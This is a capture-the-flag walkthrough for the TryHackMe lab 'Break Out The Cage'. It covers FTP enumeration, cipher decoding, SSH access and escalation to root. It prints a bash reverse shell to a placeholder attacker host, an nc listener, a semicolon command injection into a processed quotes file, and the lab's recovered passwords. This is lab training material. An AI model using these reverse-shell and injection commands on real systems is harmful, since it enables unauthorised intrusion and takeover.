# [Break Out The Cage](https://tryhackme.com/room/breakoutthecage1)

## Help Cage bring back his acting career and investigate the nefarious goings on of his agent!

# Investigate!

## Let's find out what his agent is up to....

### What is Weston's password?

1. Begin by conducting a service version scan to identify open ports and running services on the target machine

```bash
nmap -sV <TARGET_IP>
```

[SCREEN01]

2. Since anonymous FTP access is available, explore the FTP service

```bash
ftp <TARGET_IP>
anonymous
ls -la
mget dad_tasks
```

[SCREEN02]

3. The content appears to be Base64 encoded text. After Base64 decoding, the result is a Vigenère cipher. Use [CyberChef](https://gchq.github.io/CyberChef/) for Base64 decoding. For Vigenère cipher analysis use [dCode](https://www.dcode.fr/vigenere-cipher)
   - The decrypted password is: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`

[SCREEN03]

### What's the user flag?

1. With Weston's password recovered, we can now establish an SSH connection to gain initial access to the system

```bash
ssh weston@<TARGET_IP>
# Password: Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

2. Examine the current user's privileges and available sudo permissions

```bash
sudo -l
sudo /usr/bin/bees
```

[SCREEN04]

3. Conduct system enumeration to identify files owned by other users, particularly the "cage" user

```bash
find / -type f -user cage 2>/dev/null
```

[SCREEN05]

4. Created a reverse shell script in `/tmp/shell.sh`. Inject the shell execution command into a quotes file that gets processed by an automated script

**Setup reverse shell listener**

```bash
nc -lvnp 4444
```

**Create and deploy payload**

```bash
cat > /tmp/shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
EOF

chmod +x /tmp/shell.sh

printf 'Hello;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
```

5. After gaining access as the "cage" user through our reverse shell retrieve the user flag

```bash
ls -la
cat Super_Duper_Checklist
```

[SCREEN06]

### What's the root flag?

1. Now operating with "cage" user privileges, explore additional directories and files for privilege escalation opportunities

```bash
cd email_backup
cat email_3
```

[SCREEN07]

2. The email content appears to be encrypted using another Vigenère cipher. Use [CyberChef](https://gchq.github.io/CyberChef/) for Vigenère decryption, the key is `FACE`
   - The decrypted password is: `cageisnotalegend`

[SCREEN08]

3. With the discovered password, escalate privileges to root

```bash
su root
# cageisnotalegend

cat /root/email_backup/email_2
```

[SCREEN09]
